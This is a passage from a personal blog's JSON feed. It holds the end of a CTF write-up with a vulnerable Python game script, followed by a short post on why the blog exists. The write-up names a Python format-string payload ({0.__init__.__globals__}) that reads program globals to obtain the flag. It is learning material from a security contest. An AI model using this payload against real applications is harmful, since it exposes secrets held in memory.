class=\"p\">(</span><span class=\"s\">\"What difficulty will it have (hard, easy)? &gt;&gt; \"</span><span class=\"p\">)</span>    <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdout</span><span class=\"p\">.</span><span class=\"n\">flush</span><span class=\"p\">()</span>    <span class=\"n\">diff</span> <span class=\"o\">=</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdin</span><span class=\"p\">.</span><span class=\"n\">readline</span><span class=\"p\">().</span><span class=\"n\">strip</span><span class=\"p\">()</span>    <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdout</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"s\">\"How many players can play this? &gt;&gt; \"</span><span class=\"p\">)</span>    <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdout</span><span class=\"p\">.</span><span class=\"n\">flush</span><span class=\"p\">()</span>    <span class=\"n\">players</span> <span class=\"o\">=</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdin</span><span class=\"p\">.</span><span class=\"n\">readline</span><span class=\"p\">().</span><span class=\"n\">strip</span><span class=\"p\">()</span>    <span class=\"n\">games</span><span class=\"p\">[</span><span class=\"s\">'multi'</span><span class=\"p\">].</span><span class=\"n\">append</span><span class=\"p\">(</span><span class=\"n\">Multiplayer</span><span class=\"p\">(</span><span class=\"n\">name</span><span class=\"p\">,</span> <span class=\"n\">diff</span><span class=\"p\">,</span> <span class=\"n\">players</span><span class=\"p\">))</span>    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s\">\"You created your own multiplayer game\"</span><span class=\"p\">)</span><span class=\"k\">def</span> <span class=\"nf\">show_games</span><span class=\"p\">():</span>    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s\">\"</span><span class=\"se\">\\n</span><span class=\"s\">Your games: \"</span><span class=\"p\">)</span>    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s\">\"</span><span class=\"se\">\\n</span><span class=\"s\">Multiplayers: \"</span><span class=\"p\">)</span>    <span class=\"k\">for</span> <span class=\"n\">multi</span> <span class=\"ow\">in</span> <span class=\"n\">games</span><span class=\"p\">[</span><span class=\"s\">'multi'</span><span class=\"p\">]:</span>        <span class=\"n\">multi</span><span class=\"p\">.</span><span class=\"n\">show_details</span><span class=\"p\">()</span>    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s\">\"\"</span><span class=\"p\">)</span><span class=\"k\">def</span> <span class=\"nf\">main</span><span class=\"p\">():</span>    <span class=\"n\">banner</span> <span class=\"o\">=</span> <span class=\"s\">\"\"\"Banner\"\"\"</span>    <span class=\"k\">while</span> <span class=\"bp\">True</span><span class=\"p\">:</span>        <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">banner</span><span class=\"p\">)</span>        <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdout</span><span class=\"p\">.</span><span class=\"n\">flush</span><span class=\"p\">()</span>        <span class=\"n\">choice</span> <span class=\"o\">=</span> <span class=\"n\">user_choice</span><span class=\"p\">().</span><span class=\"n\">strip</span><span class=\"p\">()</span>        <span class=\"n\">choices</span> <span class=\"o\">=</span> <span class=\"p\">{</span>            <span class=\"s\">'1'</span><span class=\"p\">:</span> <span class=\"n\">show_games</span><span class=\"p\">,</span>            <span class=\"s\">'2'</span><span class=\"p\">:</span> <span class=\"n\">add_multi</span>        <span class=\"p\">}</span>        <span class=\"n\">ans</span> <span class=\"o\">=</span> <span class=\"n\">choices</span><span class=\"p\">.</span><span class=\"n\">get</span><span class=\"p\">(</span><span class=\"n\">choice</span><span class=\"p\">,</span> <span class=\"bp\">None</span><span class=\"p\">)</span>        <span class=\"k\">if</span> <span class=\"ow\">not</span> <span class=\"n\">ans</span><span class=\"p\">:</span>            <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s\">\"There is no such option mate\"</span><span class=\"p\">)</span>        <span class=\"k\">else</span><span class=\"p\">:</span>            <span class=\"n\">ans</span><span class=\"p\">()</span><span class=\"k\">if</span> <span class=\"n\">__name__</span> <span class=\"o\">==</span> <span class=\"s\">\"__main__\"</span><span class=\"p\">:</span>    <span class=\"n\">main</span><span class=\"p\">()</span></code></pre></div></div><p>Several years ago, I read an article about the format string vulnerability in C code. Until today, I never imagined the concept can be applied to python as well. The only thing fishy in the code was the print statement with formatting. Google: “format string vulnerability python” yielded this <a href=\"https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/\">GeeksForGeeks</a> article. I was able to manage to come up with  <code class=\"language-plaintext highlighter-rouge\">{0.__init__.__globals__}</code> to read the flag in the game. Anyway, these were all the challenges that I successfully solved during the live event. Event ended about an hour ago, organizers have already published everything to this git <a href=\"https://github.com/PWrWhiteHats/BtS-CTF-Challenges-03-2021\">repository</a>.</p><p>Thanks to those who organized and sponsored the event. It was a really fun experience for me after all.</p>",
            "url": "mediocreone.com/2021/03/14/break-the-syntax",
            
            
            
            "tags": ["CTF","XSS","format string","SQL injection"],
            
            "date_published": "2021-03-14T00:00:00+00:00",
            "date_modified": "2021-03-14T00:00:00+00:00",
            
                "author":  {
                "name": "mediocre_one",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "mediocreone.com/2020/10/15/why-this-blog-exists",
            "title": "Why this blog exists?",
            "summary": "Reason for blogging",
            "content_text": "Well, some of my today’s work has inspired by Lucas Kostka.  Purchase a cheap domain  Find a blog theme - All the credit goes to Ronalds Vilciņš  Google “reason for blogging” - landed on this long post which I am not likely to read through  Write this first mumbo jumbo  Put it up on the internet as fast as I could",
            "content_html": "<p>Well, some of my today’s work has inspired by <a href=\"https://fuckyousunday.com\">Lucas Kostka</a>.</p><ul>  <li>Purchase a cheap domain</li>  <li>Find a blog theme - All the credit goes to <a href=\"https://github.com/ronv/sidey\">Ronalds Vilciņš</a></li>  <li>Google “reason for blogging” - landed on <a href=\"https://bloggingwizard.com/reasons-to-start-a-blog\">this long post</a> which I am not likely to read through</li>  <li>Write this first mumbo jumbo</li>  <li>Put it up on the internet as fast as I could</li></ul>",
            "url": "mediocreone.com/2020/10/15/why-this-blog-exists",
            
            
            
            
            
            "date_published": "2020-10-15T00:00:00+00:00",
            "date_modified": "2020-10-15T00:00:00+00:00",
            
                "author":  {
                "name": "mediocre_one",
                "url": null,
                "avatar": null
                }
                
            
        }
    
    ]
}